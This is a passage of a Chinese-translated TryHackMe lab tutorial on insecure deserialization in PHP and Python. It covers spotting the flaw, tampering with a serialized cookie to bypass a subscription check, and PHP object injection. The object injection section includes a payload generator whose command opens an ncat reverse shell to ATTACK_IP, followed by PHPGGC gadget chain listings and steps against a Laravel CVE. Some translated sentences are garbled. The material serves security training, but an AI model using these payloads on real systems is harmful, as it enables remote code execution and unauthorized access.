+<li><strong>为什么使用 base64</strong>：序列化数据是二进制的，不能在所有环境中安全地显示。二进制数据可能包含可能干扰通信协议（如 HTTP）的字节。Base64 是一种将二进制数据转换为纯文本的编码方案。它仅使用可读字符，因此可以安全地通过不支持二进制数据的通道进行传输。<a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/30c29d8133d4a8bcbd803c521b9e32be.png" title="pickle.load pre-req in Python" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/30c29d8133d4a8bcbd803c521b9e32be.png" alt="pickle.load pre-req in Python"></a></li>
+<li><strong>编码过程</strong>：序列化对象后，使用 .此字符串可以安全地显示在 HTML 中，并且易于存储或传输。<code>Notes``base64.b64encode()</code></li>
+</ul>
+<p><strong>反序列化 （Unpickling）</strong></p>
+<ul>
+<li><strong>Base64 解码</strong>：解封时，首先使用 .<code>base64.b64decode()</code></li>
+<li><strong>解封</strong>：然后将二进制数据传递给 ，后者从二进制流中重建原始 Python 对象。<code>pickle.loads()</code></li>
+</ul>
+<p>同样，访问链接并输入字符串 <strong>Welcome to THM</strong>：<code>http://10.10.133.158:5000</code></p>
+<p><a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/31e397f12ca8453606e381c3b19621a8.png" title="notes app in Python" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/31e397f12ca8453606e381c3b19621a8.png" alt="notes app in Python"></a>  </p>
+<ul>
+<li><strong>Pickling</strong>：当这个字符串被 pickle 时，它会被转换为人类不可读的二进制格式。此二进制格式包含有关数据类型、数据本身以及重建对象所需的其他必要元数据的信息。</li>
+<li><strong>Base64 编码</strong>：然后将腌制数据的二进制形式编码为 Base64 字符串，该字符串可能类似于 .<code>gASVIQAAAAAAAACMBFdlbGNvbWXCoGFkZYFdcQAu</code></li>
+</ul>
+<p>在探索序列化格式时，我们讨论了如何在 PHP 和 Python 中实现这一关键功能。PHP 利用 and 函数来管理对象和其他数据类型到可以轻松重建的可存储格式的转换。同样，Python 使用该模块将对象序列化为字节流，并将它们反序列化回其原始状态。<code>serialize()``unserialize()``Pickle</code>  </p>
+<p>除了这两种语言之外，序列化是各种编程环境的通用功能，每个环境都有独特的实现和库。在 Java 中，通过接口促进了对象序列化，允许将对象转换为字节流，反之亦然，这对于网络通信和数据持久性至关重要。对于 .NET，序列化多年来已经发生了重大变化。最初，通常用于二进制序列化;但是，出于安全考虑，现在不鼓励使用它。现代 .NET 应用程序通常用于 JSON 序列化，或用于 XML 任务的 <strong>System.Xml.Serialization</strong>，这反映了向更安全、更标准化的数据交换格式的转变。Ruby 的 模块以序列化和反序列化对象而闻名，对于更人类可读的格式，它通常使用 YAML。每种语言的序列化方法都反映了其使用上下文和安全注意事项，强调了理解和正确实施序列化以确保 Web 应用程序中数据的完整性和安全性的重要性。<code>Serializable``BinaryFormatter``System.Text.Json``Marshal</code></p>
+<h2 id="鉴定"><a href="#鉴定" class="headerlink" title="鉴定"></a>鉴定</h2><p>在彻底了解不同编程语言的序列化之后，我们现在将过渡到网络安全的一个关键方面，利用和缓解与序列化相关的漏洞。在讨论漏洞利用技术的细节之前，了解如何识别应用程序中的这些漏洞至关重要，无论您是否可以访问代码（白盒测试）还是无法访问（黑盒测试）。  </p>
+<p>访问源代码<a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f7fc8a78e53eaa644b6c8a9fb6d4369c.png" title="magnifying glass over digits" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f7fc8a78e53eaa644b6c8a9fb6d4369c.png" alt="magnifying glass over digits"></a></p>
+<p>当可以访问源代码时，识别序列化漏洞可能更直接，但需要敏锐地了解要查找的内容。例如，通过代码审查，我们可以对源代码进行 e xamine 以使用序列化函数，例如 、 、 ） 等。我们必须特别注意用户提供的 input 可能直接传递给这些函数的任何点。<code>serialize()``unserialize()``pickle.loads(</code></p>
+<p>无法访问源代码</p>
+<p>在审计应用程序而不访问其源代码时，挑战在于仅根据外部观察和交互推断它如何处理数据。这通常称为<strong>黑盒测试</strong>。在这里，我们专注于检测服务器响应和 Cookie 中的模式，这些模式可能表明使用了序列化和潜在漏洞。作为渗透测试人员，在 PHP 文件名末尾使用波浪号 是攻击者用来尝试访问文本编辑器或版本控制系统创建的备份或临时文件的常见技术。编辑或保存文件时，某些文本编辑器或版本控制系统可能会制作原始文件的备份副本，并在文件名后附加波浪号。<code>~</code></p>
+<p><strong>分析 Server 响应</strong></p>
+<ul>
+<li><strong>错误消息</strong>： 某些错误消息可以间接指示序列化问题。例如，PHP 可能会抛出错误或警告，其中包含诸如 Object <strong>deserialisation error</strong> 之类的短语，这些是底层序列化过程和潜在漏洞点的泄露。<code>**unserialize()**</code></li>
+<li><strong>应用程序行为的不一致</strong>：响应纵的输入（例如，修改的 cookie 或 POST 数据）的意外行为可能表明数据反序列化和处理方式存在问题。观察应用程序如何处理更改的序列化数据可以提供有关可能易受攻击的代码的线索。</li>
+</ul>
+<p><strong>检查 Cookie</strong></p>
+<p>Cookie 通常用于在 Web 应用程序中存储序列化数据。通过检查 cookie 的内容，通常可以推断：</p>
+<ul>
+<li><strong>Cookie 中的 Base64 编码值（PHP 和 .NET）：</strong>如果 Cookie 包含看起来经过 base64 编码的数据，则解码可能会显示序列化对象或数据结构。PHP 经常使用序列化进行会话管理，并以序列化格式存储会话变量。</li>
+<li><strong>ASP.NET 视图状态</strong>：.NET 应用程序可能会在发送到客户端浏览器的视图状态中使用序列化。有时可以看到一个名为 的字段，该字段是 base64 编码的。解码和检查它可以揭示它是否包含可能被利用的序列化数据。<code>__VIEWSTATE</code></li>
+</ul>
+<p>在此任务中，我们学习了如何识别漏洞。在接下来的任务中，我们将研究利用此漏洞的各种技术。</p>
+<h2 id="利用-更新属性"><a href="#利用-更新属性" class="headerlink" title="利用 - 更新属性"></a>利用 - 更新属性</h2><p>在本任务中，我们将探索 PHP 中的一个实际示例，使用一个简单的笔记共享应用程序作为我们的案例研究。我们的笔记共享应用程序允许用户轻松创建、保存和共享笔记。用户可以将他们的笔记输入到应用程序中，然后保存以备将来参考。此外，用户可以与他人共享他们的笔记，从而促进协作和信息交换。该应用程序还包括基于订阅的功能，确保只有订阅的用户才能访问某些功能，例如笔记共享。您可以通过访问访问该网站 链接 .<code>http://10.10.133.158/case1</code></p>
+<p><a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d3b4a29dd4ca6d3357f3b5372e368468.png" title="notes-sharing app in PHP" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d3b4a29dd4ca6d3357f3b5372e368468.png" alt="notes-sharing app in PHP"></a></p>
+<p>让我们看看应用程序是如何构建的。</p>
+<p><strong>定义 Notes 类</strong></p>
+<p>该应用程序有一个类，表示应用程序中的注释。此类具有三个私有属性：、 和 。我们还有 setter 和 getter 方法来操作属性。<code>Notes``user``role``isSubscribed``isSubscribed</code>  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$role</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isSubscribed</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$role</span>, <span class="variable">$isSubscribed</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;role = <span class="variable">$role</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isSubscribed = <span class="variable">$isSubscribed</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setIsSubscribed</span>(<span class="params"><span class="variable">$isSubscribed</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isSubscribed = <span class="variable">$isSubscribed</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getIsSubscribed</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isSubscribed;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>在 Cookie 中存储用户数据</strong></p>
+<p>当用户第一次访问我们的应用程序时，它会设置一个包含其用户数据的序列化 cookie。这包括其用户名、角色和订阅状态 （）。如果用户是付费会员 （<strong>isSubscribed &#x3D; true</strong>），则允许他们共享笔记。<code>isSubscribed</code></p>
+<p><a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e5ce341b090b04e5749ad1834199bba2.png" title="Inspect element tab for viewing cookies" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e5ce341b090b04e5749ad1834199bba2.png" alt="Inspect element tab for viewing cookies"></a>  </p>
+<p><strong>利用漏洞</strong></p>
+<p>在此步骤中，我们将说明攻击者如何通过修改序列化 cookie 值来利用漏洞来获得对共享笔记的未经授权的访问权限。</p>
+<ul>
+<li><strong>序列化 cookie</strong>：解码 base64 编码的 cookie 值后，我们获得 Notes 对象的以下序列化表示：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Notes&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;role&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;isSubscribed&quot;</span>;b:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正如我们已经知道的，在 PHP 序列化中，类名在属性名前面加上前缀，以防它不是公开的，以确保唯一性并帮助反序列化。这是 PHP 在内部处理对象序列化和反序列化的一部分。当一个对象被序列化时，PHP 会存储对象的属性和类名。这确保了当对象稍后被反序列化时，PHP 知道要实例化哪个类以及如何将序列化数据正确地分配给对象的属性。让我们将序列化的 note 分解为它的各个组成部分：</p>
+<ul>
+<li><strong>O：5：“Notes”：3</strong>： 这表示类名为 Notes 的对象 （O），该对象具有三个属性。</li>
+<li><strong>s：4：“用户”;s：5：“guest”</strong>：这表示长度为 4 个字符的字符串，表示值为 “<strong>guest</strong>” 的属性。<code>user</code></li>
+<li><strong>s：4：“角色”;s：5：“guest”</strong>：与上一个类似，它表示值为 “<strong>guest</strong>” 的属性。<code>role</code></li>
+<li><strong>s：12：“isSubscribed”;b：0</strong>：这表示一个布尔值 （b） 属性，其值为 false （0）。<code>isSubscribed</code></li>
+</ul>
+<p>利用漏洞</p>
+<p>在当前场景中，当用户想要尝试共享笔记时，他们会收到以下弹出窗口：</p>
+<p><a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9bfc64dfa33447bc22bb8adb2b37ca9c.png" title="Pop-up stating Please subscribe to share the note" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9bfc64dfa33447bc22bb8adb2b37ca9c.png" alt="Pop-up stating Please subscribe to share the note"></a>  </p>
+<p>现在，后端发生了什么？后端 PHP 代码验证传入的 cookie，对其进行反序列化，然后验证用户是否已订阅。我们的主要任务是绕过这一点。</p>
+<p>假设攻击者拦截了这个序列化的 cookie 值，并将属性从 false （0） 修改为 true （1）。攻击者可以通过更改序列化数据中的布尔值，在未经合法授权的情况下操纵订阅状态。<code>isSubscribed</code></p>
+<p><a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3bc45283cd430f96411a2b62afa41cf6.png" title="pop-up with flag value" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3bc45283cd430f96411a2b62afa41cf6.png" alt="pop-up with flag value"></a></p>
+<p>修改后，攻击者将再次对序列化数据进行 base64 编码，并将原始 cookie 值替换为修改后的 cookie 值。这将授予他们在未经授权的情况下在其他平台上共享笔记的权限，从而绕过预期的订阅限制。</p>
+<h2 id="利用-对象注入"><a href="#利用-对象注入" class="headerlink" title="利用 - 对象注入"></a>利用 - 对象注入</h2><p>对象注入是由于 Web 应用程序中不安全的数据反序列化而引起的漏洞。当不受信任的数据被反序列化为对象时，攻击者可以操纵序列化数据来执行任意代码，从而导致严重的安全风险。在本任务中，我们将探索对象注入的工作原理，并通过一个简单的 PHP 代码片段演示其影响。</p>
+<p>众所周知，该漏洞来自序列化和反序列化过程，该过程允许将 PHP 对象转换为可存储格式（序列化）并重建回对象（反序列化）。虽然序列化和反序列化对于数据存储和传输很有用，但如果实施不当，它们也会带来安全风险。</p>
+<p>要利用 PHP 对象注入漏洞，应用程序应包含一个具有 PHP 魔术方法（如 或 ）的类，该方法可被用于恶意目的。在调用该方法之前，应声明所有涉及攻击的类（除非支持对象自动加载）。<code>__wakeup``__sleep``unserialize()</code>  </p>
+<p><strong>例</strong></p>
+<p>让我们考虑一个代码片段，它显示了使用 and 函数的序列化和反序列化。该代码接受 <strong>GET</strong> 参数 <strong>decode</strong> 或 <strong>encode</strong>，并相应地转换用户提供的值。<code>index.php``serialize()``unserialize()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserData</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">..</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;test.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;encode&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$userData</span> = <span class="keyword">new</span> <span class="title class_">UserData</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;encode&#x27;</span>]);</span><br><span class="line">    <span class="variable">$serializedData</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$userData</span>);</span><br><span class="line">    <span class="variable">$base64EncodedData</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serializedData</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Normal Data: &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;encode&#x27;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Serialized Data: &quot;</span> . <span class="variable">$serializedData</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Base64 Encoded Data: &quot;</span> . <span class="variable">$base64EncodedData</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;decode&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$base64EncodedData</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;decode&#x27;</span>];</span><br><span class="line">    <span class="variable">$serializedData</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$base64EncodedData</span>);</span><br><span class="line">    <span class="variable">$test</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializedData</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Base64 Encoded Serialized Data: &quot;</span> . <span class="variable">$base64EncodedData</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Serialized Data: &quot;</span> . <span class="variable">$serializedData</span>;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>例如，如果我们通过 URL <a target="_blank" rel="noopener" href="http://10.10.133.158/case2/?encode=hellothm">http://10.10.133.158/case2/?encode=hellothm</a> 发送输入 <strong>hellothm</strong>，我们将得到以下输出：</p>
+<p><a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/711bd1f1f1922a3ae8dc0fe0e32fac81.png" title="serialised state in PHP" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/711bd1f1f1922a3ae8dc0fe0e32fac81.png" alt="serialised state in PHP"></a></p>
+<p>我们看到代码包含一个名为 .从源代码审查或考虑框架是否开源，渗透测试者知道它包含一个名为 class 的类，如下所示：<code>test.php``test.php``MaliciousUserData</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaliciousUserData</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&#x27;ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh&#x27;</span>; <span class="comment">// call to troubleshooting server</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;command);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在上面的代码中，通过不安全的反序列化，可以操作对象的属性，包括更改上述代码中类的属性。这可以通过制作包含所需属性值的特制序列化字符串来实现。例如，如果我们想修改 属性以执行不同的命令或连接到不同的服务器，我们可以序列化具有所需属性值的对象，然后将其注入到易受攻击的 函数中。这样，在反序列化时，作的属性值将被加载到对象中。<code>command``MaliciousUserData``command``unserialize()</code></p>
+<p>重要的是要了解在不安全的反序列化期间，你不能直接更新方法本身的定义。该方法是类定义的一部分，在反序列化过程中保持静态。但是，您可以做的是在方法中修改对象的行为或属性。这意味着，虽然该方法的定义保持不变，但可以操纵它在反序列化时的操作以实现不同的结果。<code>__wakeup``__wakeup``__wakeup</code>  </p>
+<p>现在我们已经了解了基础知识，是时候准备有效负载了。</p>
+<p>准备 Payload</p>
+<p>如前所述，调用另一个类是 PHP 中的正常功能，如果目标网站使用的是开源代码，则可以查看该文件的代码。 中的代码盲目地反序列化输入，而不执行任何清理。这里有什么选项？如果我们修改类并修改其属性，以便在调用函数时，将使用攻击者提供的值调用它，该怎么办？<code>index.php``MaliciousUserData``command``__wakeup</code></p>
+<p>让我们在 AttackBox 上创建一些 PHP 代码，以生成恶意序列化用户数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaliciousUserData</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&#x27;ncat -nv ATTACK_IP 4444 -e /bin/sh&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$maliciousUserData</span> = <span class="keyword">new</span> <span class="title class_">MaliciousUserData</span>();</span><br><span class="line"><span class="variable">$serializedData</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$maliciousUserData</span>);</span><br><span class="line"><span class="variable">$base64EncodedData</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serializedData</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Base64 Encoded Serialized Data: &quot;</span> . <span class="variable">$base64EncodedData</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>在上面的代码中，类 （） 的函数将使用 Ncat 执行反向 shell 命令，以连接到指定的 IP 地址 （） 和带有 -e 标志的端口 （） 作为 shell 执行<code>_wakeup()``MaliciousUserData``test.php``ATTACK_IP``4444``/bin/sh</code></p>
+</li>
+<li><p>创建文件后，通过终端执行它。这将返回该类的 base64 编码的序列化对象。<code>php index.php``MaliciousUserData</code></p>
+</li>
+<li><p>生成的 base64 编码字符串将如下所示：.<code>TzoxNzoiTWFsaWNp[Redacted]</code></p>
+</li>
+<li><p>使用 AttackBox 上的命令在端口 4444 上启动 Netcat 侦听器。<code>nc -nvlp 4444</code></p>
+</li>
+<li><p>现在，是时候利用不安全的反序列化了，通过访问 URL 来解码 shellcode，而不生成 shellcode。<code>http://10.10.133.158/case2/?decode=[SHELLCODE]</code>  </p>
+</li>
+<li><p>访问 URL 后，index.php 文件的 deserialise 函数将反序列化字符串并执行该函数，从而导致远程 shell。<code>__wakeup()</code></p>
+</li>
+</ul>
+<p>终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thm@ubuntu$ nc -nvlp 4444</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 4444)</span><br><span class="line">Connection from ATTACK_IP 35838 received! </span><br></pre></td></tr></table></figure>
+
+<p>在接下来的任务中，我们将了解允许攻击者利用漏洞的问题，以及我们如何从安全编码人员的角度保护它。</p>
+<h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><p>在渗透测试期间自动执行脚本对于有效识别和利用 Web 应用程序中的漏洞至关重要。在本任务中，我们将探索一种名为 <strong>PHP Gadge Chain （PHPGGC）</strong> 的工具，该工具在此过程中起着至关重要的作用，可以自动发现不安全的反序列化漏洞。PHPGGC 类似于 Java 生态系统中的 Ysoserial，可帮助安全专业人员评估 PHP 应用程序的安全状况并降低潜在风险。</p>
+<p>菲律宾小工具链 （PHPGGC）  </p>
+<p>PHPGGC 主要是一种用于生成 PHP 对象注入攻击中使用的小工具链的工具，专门用于利用与 PHP 对象序列化和反序列化相关的漏洞。</p>
+<p><strong>功能性</strong></p>
+<ul>
+<li><p><strong>小工具链</strong>：PHPGGC 为各种 PHP 框架和库提供了小工具链库。这些小工具链是一系列对象和方法，旨在当 PHP 应用程序不安全地反序列化用户提供的数据时利用特定漏洞。  </p>
+</li>
+<li><p><strong>Payload Generation</strong>：PHPGGC 的主要目的是促进生成可以触发这些漏洞的序列化 payloads。它可以帮助安全研究人员和渗透测试人员创建有效载荷，以证明不安全的反序列化缺陷的影响。</p>
+</li>
+<li><p><strong>Payload Customisation</strong>：用户可以通过为小工具链中涉及的函数或方法指定参数来自定义 payload，从而定制攻击以实现特定结果，例如编码。</p>
+</li>
+</ul>
+<p>您可以从 PHPGGC 的 <a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">GitHub 存储库</a>下载 PHPGGC，也可以通过该目录使用 AttackBox 上已有的版本。安装的版本已经包含一些小工具链、PHP 对象序列和旨在利用反序列化漏洞的方法调用。这些小工具链利用 PHP 的神奇方法来实现各种攻击目标，例如远程代码执行。<br>要列出所有可用的小工具链，您可以使用 PHPGGC 的选项，它将显示用于发起特定攻击的 名称、版本、类型和向量。此外，您还可以根据小工具链的功能过滤小工具链，例如针对特定 PHP 框架或实现特定利用技术的链，使用选项后跟过滤器关键字（Drupal、Laravel 等）。这允许您为您的利用场景选择合适的小工具链，如下所示：<code>/opt/phpggc``-l``-l</code></p>
+<p>终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">thm@machine$ php phpggc -l</span><br><span class="line"></span><br><span class="line">Gadget Chains</span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">NAME                                      VERSION                                                 TYPE                      VECTOR          I    </span><br><span class="line">Bitrix/RCE1                               17.x.x &lt;= 22.0.300                                      RCE: Command              __destruct           </span><br><span class="line">CakePHP/RCE1                              ? &lt;= 3.9.6                                              RCE: Command              __destruct           </span><br><span class="line">CakePHP/RCE2                              ? &lt;= 4.2.3                                              RCE: Command              __destruct           </span><br><span class="line">CodeIgniter4/FD1                          &lt;= 4.3.6                                                File delete               __destruct           </span><br><span class="line">CodeIgniter4/FD2                          &lt;= 4.3.7                                                File delete               __destruct           </span><br><span class="line">CodeIgniter4/FR1                          4.0.0 &lt;= 4.3.6                                          File read                 __toString      *    </span><br><span class="line">CodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           </span><br><span class="line">CodeIgniter4/RCE2                         4.0.0-rc.4 &lt;= 4.3.6                                     RCE: Command              __destruct           </span><br><span class="line">CodeIgniter4/RCE3                         4.0.4 &lt;= 4.4.3                                          RCE: Command              __destruct           </span><br><span class="line">CodeIgniter4/RCE4                         4.0.0-beta.1 &lt;= 4.0.0-rc.4                              RCE: Command              __destruct         </span><br></pre></td></tr></table></figure>
+
+<p>例如，输出 for 表示名为 的小工具链 利用了 CakePHP 版本中的 RCE 漏洞。该漏洞允许攻击者利用 magic 方法在服务器上执行任意命令 。<code>CakePHP/RCE1``CakePHP/RCE1``3.9.6``__destruct</code></p>
+<p>利用 Web 应用程序  </p>
+<p>作为渗透测试人员，我们专注于 Laravel 网站，以利用 <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-15133">CVE-2018-15133</a> 下发现的已知漏洞。当 Laravel 从 . 如果不安全处理，此反序列化过程可能会导致在服务器上执行任意代码。有关漏洞的详细信息可以从 <a target="_blank" rel="noopener" href="https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30">Laravel 安全版本中</a>读取，但我们的主要重点是如何在利用过程中利用 PHP 小工具链。上述漏洞可以通过三个主要因素来利用：<code>X-XSRF-TOKEN</code></p>
+<ul>
+<li><strong>第 1 步</strong>：需要来自 Laravel，框架使用它来加密 XSRF 令牌。<code>APP_KEY</code></li>
+<li><strong>第 2 步</strong>：使用 PHPGGC 生成执行命令的未序列化有效负载。这被认为是一项复杂的任务，该工具可以提供帮助。</li>
+<li><strong>第 3 步</strong>：最后，我们必须使用 APP_KEY 加密有效负载并发送 POST 请求。这通常因框架而异。</li>
+</ul>
+<p>在这个任务中，我们的重点将主要放在第 2 步，并了解 PHPGGC 将如何帮助我们作为渗透测试人员。访问 <a target="_blank" rel="noopener" href="http://10.10.133.158:8089/">http://10.10.133.158:8089</a> 易受攻击的 Laravel 应用程序。作为渗透测试人员，我们可以通过多种技术来识别 Web 应用程序版本。您可以访问 <a target="_blank" rel="noopener" href="https://tryhackme.com/module/information-gathering-and-vulnerability-scanning">信息收集和漏洞扫描</a> 模块以详细了解这一点。Laravel 应用程序版本为 5.6.29。</p>
